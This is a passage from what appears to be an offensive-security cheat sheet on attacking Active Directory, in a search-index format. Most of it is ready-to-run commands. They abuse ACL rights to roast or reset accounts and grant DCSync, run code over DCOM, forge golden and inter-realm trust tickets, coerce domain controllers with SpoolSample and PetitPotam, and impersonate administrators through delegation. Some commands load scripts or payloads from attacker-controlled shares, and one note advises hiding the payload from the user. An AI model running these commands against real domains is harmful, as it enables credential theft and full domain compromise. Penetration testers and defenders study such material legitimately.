its hash and kerberoast it.   <pre><code># Check for interesting permissions on accounts:\nInvoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match \"RDPUsers\"}\n# Check if current user has already an SPN setted:\nPowerView2 &gt; Get-DomainUser -Identity &lt;UserName&gt; | select serviceprincipalname\n# Force set the SPN on the account: Targeted Kerberoasting\nPowerView2 &gt; Set-DomainObject &lt;UserName&gt; -Set @{serviceprincipalname='ops/whatever1'}\nPowerView3 &gt; Set-DomainObject -Identity &lt;UserName&gt; -Set @{serviceprincipalname='any/thing'}\n# Grab the ticket\nPowerView2 &gt; $User = Get-DomainUser username \nPowerView2 &gt; $User | Get-DomainSPNTicket | fl\nPowerView2 &gt; $User | Select serviceprincipalname\n# Remove the SPN\nPowerView2 &gt; Set-DomainObject -Identity username -Clear serviceprincipalname\n</code></pre></li> <li>GenericAll/GenericWrite : We can change a victim's userAccountControl to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back.<ul> <li>On Windows: <pre><code># Modify the userAccountControl\nPowerView2 &gt; Get-DomainUser username | ConvertFrom-UACValue\nPowerView2 &gt; Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose\n# Grab the ticket\nPowerView2 &gt; Get-DomainUser username | ConvertFrom-UACValue\nASREPRoast &gt; Get-ASREPHash -Domain domain.local -UserName username\n# Set back the userAccountControl\nPowerView2 &gt; Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose\nPowerView2 &gt; Get-DomainUser username | ConvertFrom-UACValue\n</code></pre></li> <li>On Linux: <pre><code># Modify the userAccountControl\n$ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 True\n# Grab the ticket\n$ GetNPUsers.py DOMAIN/target_user -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;\n# Set back the userAccountControl\n$ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 False\n</code></pre></li> </ul> </li> </ul>"},{"location":"active-directory/active-directory-attacks/#genericwrite","title":"GenericWrite","text":"<ul> <li>Reset another user's password<ul> <li>On Windows:     <pre><code># https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1\n$user = 'DOMAIN\\user1'; \n$pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; \n$creds = New-Object System.Management.Automation.PSCredential $user, $pass;\n$newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; \nSet-DomainUserPassword -Identity 'DOMAIN\\user2' -AccountPassword $newpass -Credential $creds;\n</code></pre></li> <li>On Linux:     <pre><code># Using rpcclient from the  Samba software suite\nrpcclient -U 'attacker_user%my_password' -W DOMAIN -c \"setuserinfo2 target_user 23 target_newpwd\" \n\n# Using bloodyAD with pass-the-hash\nbloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd\n</code></pre></li> </ul> </li> <li>WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : <code>Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue \"\\\\10.0.0.5\\totallyLegitScript.ps1</code></li> </ul>"},{"location":"active-directory/active-directory-attacks/#genericwrite-and-remote-connection-manager","title":"GenericWrite and Remote Connection Manager","text":"<p>Now let\u2019s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called \u2018Environment\u2019.</p> <p>This tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the \u2018Starting program\u2019 field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. - https://sensepost.com/blog/2020/ace-to-rce/  The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (&gt;2016), it requires a registry change to re-enable. <pre><code>$UserObject = ([ADSI](\"LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld\"))\n$UserObject.TerminalServicesInitialProgram = \"\\\\1.2.3.4\\share\\file.exe\"\n$UserObject.TerminalServicesWorkDirectory = \"C:\\\"\n$UserObject.SetInfo()\n</code></pre> NOTE: To not alert the user the payload should hide its own process window and spawn the normal graphical environment.</p>"},{"location":"active-directory/active-directory-attacks/#writedacl","title":"WriteDACL","text":"<p>To abuse <code>WriteDacl</code> to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. Invoke-ACLPwn is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : <code>./Invoke-ACL.ps1 -SharpHoundLocation .\\sharphound.exe -mimiKatzLocation .\\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'</code> * WriteDACL on Domain:     * On Windows:        <pre><code># Give DCSync right to the principal identity\nImport-Module .\\PowerView.ps1\n$SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\\user1', $SecPassword)\nAdd-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local \n</code></pre>     * On Linux:     <pre><code># Give DCSync right to the principal identity\nbloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B setDCSync user2\n\n# Remove right after DCSync\nbloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B setDCSync user2 False\n</code></pre></p> <ul> <li>WriteDACL on Group   <pre><code>Add-DomainObjectAcl -TargetIdentity \"INTERESTING_GROUP\" -Rights WriteMembers -PrincipalIdentity User1\nnet group \"INTERESTING_GROUP\" User1 /add /domain\n</code></pre>   Or   ```powershell   bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp</li> </ul> <p># Remove right   bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp False     ```</p>"},{"location":"active-directory/active-directory-attacks/#writeowner","title":"WriteOwner","text":"<p>An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. This can be achieved with Set-DomainObjectOwner (PowerView module). <pre><code>Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'\n</code></pre> Or <pre><code>bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setOwner devil_user1 target_object\n</code></pre> This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.</p>"},{"location":"active-directory/active-directory-attacks/#readlapspassword","title":"ReadLAPSPassword","text":"<p>An attacker can read the LAPS password of the computer account this ACE applies to. This can be achieved with the Active Directory PowerShell module. Detail of the exploitation can be found in the Reading LAPS Password section. <pre><code>Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'\n</code></pre> Or for a given computer <pre><code>bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes LAPS_PC$ ms-mcs-admpwd,ms-mcs-admpwdexpirationtime\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#readgmsapassword","title":"ReadGMSAPassword","text":"<p>An attacker can read the GMSA password of the account this ACE applies to. This can be achieved with the Active Directory and DSInternals PowerShell modules. <pre><code># Save the blob to a variable\n$gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword'\n$mp = $gmsa.'msDS-ManagedPassword'\n# Decode the data structure using the DSInternals module\nConvertFrom-ADManagedPasswordBlob $mp\n</code></pre> Or <pre><code>python bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes gmsaAccount$ msDS-ManagedPassword\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#forcechangepassword","title":"ForceChangePassword","text":"<p>An attacker can change the password of the user this ACE applies to: * On Windows, this can be achieved with <code>Set-DomainUserPassword</code> (PowerView module): <pre><code>$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\nSet-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword\n</code></pre> * On Linux: <pre><code># Using rpcclient from the  Samba software suite\nrpcclient -U 'attacker_user%my_password' -W DOMAIN -c \"setuserinfo2 target_user 23 target_newpwd\" \n# Using bloodyAD with pass-the-hash\nbloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#dcom-exploitation","title":"DCOM Exploitation","text":"<p>DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer. * Impacket DCOMExec.py   <pre><code>dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC] [-object [{ShellWindows,ShellBrowserWindow,MMC20}]] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-A authfile] [-keytab KEYTAB] target [command ...]\ndcomexec.py -share C$ -object MMC20 '&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;MACHINE_CIBLE&gt;'\ndcomexec.py -share C$ -object MMC20 '&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;MACHINE_CIBLE&gt;' 'ipconfig'\npython3 dcomexec.py -object MMC20 -silentcommand -debug $DOMAIN/$USER:$PASSWORD\\$@$HOST 'notepad.exe'\n# -object MMC20 specifies that we wish to instantiate the MMC20.Application object.\n# -silentcommand executes the command without attempting to retrieve the output.\n</code></pre> * CheeseTools - https://github.com/klezVirus/CheeseTools   <pre><code># https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/\n-t, --target=VALUE         Target Machine\n-b, --binary=VALUE         Binary: powershell.exe\n-a, --args=VALUE           Arguments: -enc &lt;blah&gt;\n-m, --method=VALUE         Methods: MMC20Application, ShellWindows,\n                            ShellBrowserWindow, ExcelDDE, VisioAddonEx,\n                            OutlookShellEx, ExcelXLL, VisioExecLine, \n                            OfficeMacro\n-r, --reg, --registry      Enable registry manipulation\n-h, -?, --help             Show Help\nCurrent Methods: MMC20.Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro.\n</code></pre> * Invoke-DCOM - https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1   <pre><code>Import-Module .\\Invoke-DCOM.ps1\nInvoke-DCOM -ComputerName '10.10.10.10' -Method MMC20.Application -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '10.10.10.10' -Method ExcelDDE -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '10.10.10.10' -Method ServiceStart \"MyService\"\nInvoke-DCOM -ComputerName '10.10.10.10' -Method ShellBrowserWindow -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '10.10.10.10' -Method ShellWindows -Command \"calc.exe\"\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#dcom-via-mmc-application-class","title":"DCOM via MMC Application Class","text":"<p>This COM object (MMC20.Application) allows you to script components of MMC snap-in operations. there is a method named \"ExecuteShellCommand\" under Document.ActiveView. <pre><code>PS C:\\&gt; $com = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"10.10.10.1\"))\nPS C:\\&gt; $com.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\calc.exe\",$null,$null,7)\nPS C:\\&gt; $com.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\",$null,\"-enc DFDFSFSFSFSFSFSFSDFSFSF &lt; Empire encoded string &gt; \",\"7\")\n# Weaponized example with MSBuild\nPS C:\\&gt; [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"10.10.10.1\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\",$null,\"\\\\10.10.10.2\\webdav\\build.xml\",\"7\")\n</code></pre> Invoke-MMC20RCE : https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1</p>"},{"location":"active-directory/active-directory-attacks/#dcom-via-office","title":"DCOM via Office","text":"<ul> <li>Excel.Application</li> <li>DDEInitiate</li> <li>RegisterXLL</li> <li>Outlook.Application</li> <li>CreateObject-&gt;Shell.Application-&gt;ShellExecute</li> <li>CreateObject-&gt;ScriptControl (office-32bit only)</li> <li>Visio.InvisibleApp (same as Visio.Application, but should not show the Visio window)</li> <li>Addons</li> <li>ExecuteLine</li> <li>Word.Application</li> <li>RunAutoMacro <pre><code># Powershell script that injects shellcode into excel.exe via ExecuteExcel4Macro through DCOM\nInvoke-Excel4DCOM64.ps1 https://gist.github.com/Philts/85d0f2f0a1cc901d40bbb5b44eb3b4c9\nInvoke-ExShellcode.ps1 https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a\n# Using Excel DDE\nPS C:\\&gt; $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"$ComputerName\"))\nPS C:\\&gt; $excel.DisplayAlerts = $false\nPS C:\\&gt; $excel.DDEInitiate(\"cmd\", \"/c calc.exe\")\n# Using Excel RegisterXLL\n# Can't be used reliably with a remote target\nRequire: reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\Trusted Locations /v AllowsNetworkLocations /t REG_DWORD /d 1\nPS&gt; $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"$ComputerName\"))\nPS&gt; $excel.RegisterXLL(\"EvilXLL.dll\")\n# Using Visio\n$visio = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Visio.InvisibleApp\", \"$ComputerName\"))\n$visio.Addons.Add(\"C:\\Windows\\System32\\cmd.exe\").Run(\"/c calc\")\n</code></pre></li> </ul>"},{"location":"active-directory/active-directory-attacks/#dcom-via-shellexecute","title":"DCOM via ShellExecute","text":"<pre><code>$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',\"10.10.10.1\")\n$obj = [System.Activator]::CreateInstance($com)\n$item = $obj.Item()\n$item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#dcom-via-shellbrowserwindow","title":"DCOM via ShellBrowserWindow","text":"<p> Windows 10 only, the object doesn't exists in Windows 7 <pre><code>$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',\"10.10.10.1\")\n$obj = [System.Activator]::CreateInstance($com)\n$obj.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#trust-relationship-between-domains","title":"Trust relationship between domains","text":"<ul> <li>One-way</li> <li>Domain B trusts A</li> <li>Users in Domain A can access resources in Domain B</li> <li>Users in Domain B cannot access resources in Domain A</li> <li>Two-way</li> <li>Domain A trusts Domain B</li> <li>Domain B trusts Domain A</li> <li>Authentication requests can be passed between the two domains in both directions</li> </ul>"},{"location":"active-directory/active-directory-attacks/#enumerate-trusts-between-domains","title":"Enumerate trusts between domains","text":"<ul> <li>Native <code>nltest</code> <pre><code>nltest /trusted_domains\n</code></pre></li> <li>PowerShell <code>GetAllTrustRelationships</code> <pre><code>([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\nSourceName          TargetName                    TrustType      TrustDirection\n----------          ----------                    ---------      --------------\ndomainA.local      domainB.local                  TreeRoot       Bidirectional\n</code></pre></li> <li>Crackmapexec module <code>enum_trusts</code> <pre><code>cme ldap &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -M enum_trusts \n</code></pre></li> </ul>"},{"location":"active-directory/active-directory-attacks/#exploit-trusts-between-domains","title":"Exploit trusts between domains","text":"<p> Require a Domain-Admin level access to the current domain. | Source     | Target  | Technique to use  | Trust relationship  | |---|---|---|---| | Root      | Child  | Golden Ticket + Enterprise Admin group (Mimikatz /groups) | Inter Realm (2-way)  | | Child     | Child  | SID History exploitation (Mimikatz /sids)                 | Inter Realm Parent-Child (2-way)  | | Child     | Root   | SID History exploitation (Mimikatz /sids)                 | Inter Realm Tree-Root (2-way)  | | Forest A  | Forest B  | PrinterBug + Unconstrained delegation ?  | Inter Realm Forest or External (2-way)  |</p>"},{"location":"active-directory/active-directory-attacks/#child-domain-to-forest-compromise-sid-hijacking","title":"Child Domain to Forest Compromise - SID Hijacking","text":"<p>Most trees are linked with dual sided trust relationships to allow for sharing of resources. By default the first domain created if the Forest Root. Requirements:  - KRBTGT Hash - Find the SID of the domain     <pre><code>$ Convert-NameToSid target.domain.com\\krbtgt\nS-1-5-21-2941561648-383941485-1389968811-502\n# with Impacket\nlookupsid.py domain/user:password@10.10.10.10\n</code></pre> - Replace 502 with 519 to represent Enterprise Admins - Create golden ticket and attack parent domain.      <pre><code>kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#forest-to-forest-compromise-trust-ticket","title":"Forest to Forest Compromise - Trust Ticket","text":"<ul> <li>Require: SID filtering disabled From the DC, dump the hash of the <code>currentdomain\\targetdomain$</code> trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using  Mimikatz, adding the SID for the target domain's enterprise admins group to our SID history.</li> </ul>"},{"location":"active-directory/active-directory-attacks/#dumping-trust-passwords-trust-keys","title":"Dumping trust passwords (trust keys)","text":"<p>Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing $ are computer accounts, but some are trust accounts. <pre><code>lsadump::trust /patch\nor find the TRUST_NAME$ machine account hash\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#create-a-forged-trust-ticket-inter-realm-tgt-using-mimikatz","title":"Create a forged trust ticket (inter-realm TGT) using Mimikatz","text":"<pre><code>mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\\temp\\trust.kirbi\nmimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\\ad\\tools\\mcorp-ticket.kirbi\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#use-the-trust-ticket-file-to-get-a-st-for-the-targeted-service","title":"Use the Trust Ticket file to get a ST for the targeted service","text":"<p><pre><code>.\\asktgs.exe c:\\temp\\trust.kirbi CIFS/machine.domain.local\n.\\Rubeus.exe asktgs /ticket:c:\\ad\\tools\\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt\n</code></pre> Inject the ST file and access the targeted service with the spoofed rights. <pre><code>kirbikator lsa .\\ticket.kirbi\nls \\\\machine.domain.local\\c$\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#privileged-access-management-pam-trust","title":"Privileged Access Management (PAM) Trust","text":"<p>PAM (Privileged access managment) introduces bastion forest for management, Shadow Security Principals (groups mapped to high priv groups of managed forests). These allow management of other forests without making changes to groups or ACLs and without interactive logon. Requirements:  * Windows Server 2016 or earlier  If we compromise the bastion we get <code>Domain Admins</code> privileges on the other domain * Default configuration for PAM Trust     <pre><code># execute on our forest\nnetdom trust lab.local /domain:bastion.local /ForestTransitive:Yes \nnetdom trust lab.local /domain:bastion.local /EnableSIDHistory:Yes \nnetdom trust lab.local /domain:bastion.local /EnablePIMTrust:Yes \nnetdom trust lab.local /domain:bastion.local /Quarantine:No\n# execute on our bastion\nnetdom trust bastion.local /domain:lab.local /ForestTransitive:Yes\n</code></pre> * Enumerate PAM trusts     <pre><code># Detect if current forest is PAM trust\nImport ADModule\nGet-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}\n# Enumerate shadow security principals \nGet-ADObject -SearchBase (\"CN=Shadow Principal Configuration,CN=Services,\" + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl\n# Enumerate if current forest is managed by a bastion forest\n# Trust_Attribute_PIM_Trust + Trust_Attribute_Treat_As_External\nGet-ADTrust -Filter {(ForestTransitive -eq $True)} \n</code></pre> * Compromise     * Using the previously found Shadow Security Principal (WinRM account, RDP access, SQL, ...)     * Using SID History * Persistence   <pre><code># Add a compromised user to the group \nSet-ADObject -Identity \"CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local\" -Add @{'member'=\"CN=Administrator,CN=Users,DC=domain,DC=local\"}\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#kerberos-unconstrained-delegation","title":"Kerberos Unconstrained Delegation","text":"<p>The user sends a ST to access the service, along with their TGT, and then the service can use the user's TGT to request a ST for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html  When a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory.   Unconstrained delegation used to be the only option available in Windows 2000 Warning Remember to coerce to a HOSTNAME if you want a Kerberos Ticket</p>"},{"location":"active-directory/active-directory-attacks/#spoolservice-abuse-with-unconstrained-delegation","title":"SpoolService Abuse with Unconstrained Delegation","text":"<p>The goal is to gain DC Sync privileges using a computer account and the SpoolService bug. Requirements: - Object with Property Trust this computer for delegation to any service (Kerberos only) - Must have ADS_UF_TRUSTED_FOR_DELEGATION  - Must not have ADS_UF_NOT_DELEGATED flag - User must not be in the Protected Users group  - User must not have the flag Account is sensitive and cannot be delegated</p>"},{"location":"active-directory/active-directory-attacks/#find-delegation","title":"Find delegation","text":"<p> : Domain controllers usually have unconstrained delegation enabled.   Check the <code>TRUSTED_FOR_DELEGATION</code> property. * ADModule <pre><code># From https://github.com/samratashok/ADModule\nPS&gt; Get-ADComputer -Filter {TrustedForDelegation -eq $True}\n</code></pre> * ldapdomaindump <pre><code>$&gt; ldapdomaindump -u \"DOMAIN\\\\Account\" -p \"Password123*\" 10.10.10.10   \ngrep TRUSTED_FOR_DELEGATION domain_computers.grep\n</code></pre> * CrackMapExec module <pre><code>cme ldap 10.10.10.10 -u username -p password --trusted-for-delegation\n</code></pre> * BloodHound: <code>MATCH (c:Computer {unconstraineddelegation:true}) RETURN c</code> * Powershell Active Directory module: <code>Get-ADComputer -LDAPFilter \"(&amp;(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" -Properties DNSHostName,userAccountControl</code></p>"},{"location":"active-directory/active-directory-attacks/#spoolservice-status","title":"SpoolService status","text":"<p>Check if the spool service is running on the remote host <pre><code>ls \\\\dc01\\pipe\\spoolss\npython rpcdump.py DOMAIN/user:password@10.10.10.10\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#monitor-with-rubeus","title":"Monitor with Rubeus","text":"<p>Monitor incoming connections from Rubeus. <pre><code>Rubeus.exe monitor /interval:1 \n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#force-a-connect-back-from-the-dc","title":"Force a connect back from the DC","text":"<p>Due to the unconstrained delegation, the TGT of the computer account (DC$) will be saved in the memory of the computer with unconstrained delegation. By default the domain controller computer account has DCSync rights over the domain object.</p> <p>SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a \"feature\" in the MS-RPRN RPC interface. <pre><code># From https://github.com/leechristensen/SpoolSample\n.\\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME\n.\\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB\n# DC01.HACKER.LAB is the domain controller we want to compromise\n# HELPDESK.HACKER.LAB is the machine with delegation enabled that we control.\n# From https://github.com/dirkjanm/krbrelayx\nprinterbug.py 'domain/username:password'@&lt;VICTIM-DC-NAME&gt; &lt;UNCONSTRAINED-SERVER-DC-NAME&gt;\n# From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689\npython dementor.py -d domain -u username -p password &lt;UNCONSTRAINED-SERVER-DC-NAME&gt; &lt;VICTIM-DC-NAME&gt;\n</code></pre> If the attack worked you should get a TGT of the domain controller.</p>"},{"location":"active-directory/active-directory-attacks/#load-the-ticket","title":"Load the ticket","text":"<p>Extract the base64 TGT from Rubeus output and load it to our current session. <pre><code>.\\Rubeus.exe asktgs /ticket:&lt;ticket base64&gt; /service:LDAP/dc.lab.local,cifs/dc.lab.local /ptt\n</code></pre> Alternatively you could also grab the ticket using Mimikatz :  <code>mimikatz # sekurlsa::tickets</code> Then you can use DCsync or another attack : <code>mimikatz # lsadump::dcsync /user:HACKER\\krbtgt</code></p>"},{"location":"active-directory/active-directory-attacks/#mitigation","title":"Mitigation","text":"<ul> <li>Ensure sensitive accounts cannot be delegated</li> <li>Disable the Print Spooler Service</li> </ul>"},{"location":"active-directory/active-directory-attacks/#ms-efsrpc-abuse-with-unconstrained-delegation","title":"MS-EFSRPC Abuse with Unconstrained Delegation","text":"<p>Using <code>PetitPotam</code>, another tool to coerce a callback from the targeted machine, instead of <code>SpoolSample</code>. <pre><code># Coerce the callback\ngit clone https://github.com/topotam/PetitPotam\npython3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP\npython3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP\n# Extract the ticket\n.\\Rubeus.exe asktgs /ticket:&lt;ticket base64&gt; /ptt\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#kerberos-constrained-delegation","title":"Kerberos Constrained Delegation","text":"<p>Kerberos Constrained Delegation (KCD) is a security feature in Microsoft's Active Directory (AD) that allows a service to impersonate a user or another service in order to access resources on behalf of that user or service.</p>"},{"location":"active-directory/active-directory-attacks/#identify-a-constrained-delegation","title":"Identify a Constrained Delegation","text":"<ul> <li>BloodHound: <code>MATCH p = (a)-[:AllowedToDelegate]-&gt;(c:Computer) RETURN p</code></li> <li>PowerView: <code>Get-NetComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto | ft</code></li> <li>Native   <pre><code>Get-DomainComputer -TrustedToAuth | select -exp dnshostname\nGet-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo\n</code></pre></li> </ul>"},{"location":"active-directory/active-directory-attacks/#exploit-the-constrained-delegation","title":"Exploit the Constrained Delegation","text":"<ul> <li>Impacket   <pre><code>getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10\n</code></pre></li> <li>Rubeus: S4U2 attack (S4U2self + S4U2proxy)   <pre><code># with a password\nRubeus.exe s4u /nowrap /msdsspn:\"time/target.local\" /altservice:cifs /impersonateuser:\"administrator\" /domain:\"domain\" /user:\"user\" /password:\"password\"\n# with a NT hash\nRubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:time/srv01.domain.com /altservice:cifs /ptt\nRubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:\"cifs/dc.domain.com\" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt\ndir \\\\dc.domain.com\\c$\n</code></pre></li> <li>Rubeus: use an existing ticket to perform a S4U2 attack to impersonate the \"Administrator\"   <pre><code># Dump ticket\nRubeus.exe tgtdeleg /nowrap\nRubeus.exe triage\nRubeus.exe dump /luid:0x12d1f7\n# Create a ticket\nRubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt\n</code></pre></li> <li>Rubeus : using aes256 keys   <pre><code># Get aes256 keys of the machine account\nprivilege::debug\ntoken::elevate\nsekurlsa::ekeys\n# Create a ticket\nRubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /user:win10x64$ /aes256:4b55f...fd82 /ptt\n</code></pre></li> </ul>"},{"location":"active-directory/active-directory-attacks/#impersonate-a-domain-user-on-a-resource","title":"Impersonate a domain user on a resource","text":"<p>Require: * SYSTEM level privileges on a machine configured with constrained delegation <pre><code>PS&gt; [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null\nPS&gt; $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')\nPS&gt; $idToImpersonate.Impersonate()\nPS&gt; [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name\nPS&gt; ls 